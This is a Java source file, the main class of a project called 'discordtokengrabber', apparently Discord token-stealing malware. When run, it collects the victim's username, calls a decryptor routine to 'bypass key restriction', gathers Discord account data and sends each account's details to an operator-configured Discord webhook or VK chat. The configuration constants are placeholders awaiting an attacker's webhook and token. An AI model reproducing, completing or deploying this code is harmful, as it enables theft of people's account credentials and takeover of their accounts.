package com.github.dedinc.discordtokengrabber;

import com.github.dedinc.discordtokengrabber.objects.Account;
import com.github.dedinc.discordtokengrabber.utils.Helper;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class Main {
    public static final boolean VK_ENABLED = false; // If need send to VK
    public static final String WEBHOOK_URL = "DISCORD WEBHOOK URL";
    public static final String VK_TOKEN = "VK TOKEN"; // If VK enabled
    public static final int VK_RECEIVER_ID = 1337; // ID of user/group/chat to send log in VK

    public static void main(String[] args) {
        String timestamp = new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime());
        String username = System.getenv("USERNAME");
        Helper.getSender().sendMessage(String.format("[%s] - Searching token on %s", timestamp, username));
        Helper.getDecryptor().bypassKeyRestriction();
        for (Account account : Helper.getHandler().getAccounts()) {
            Helper.getSender().sendMessage(account.getJSONFormat().toString());
        }
    }
}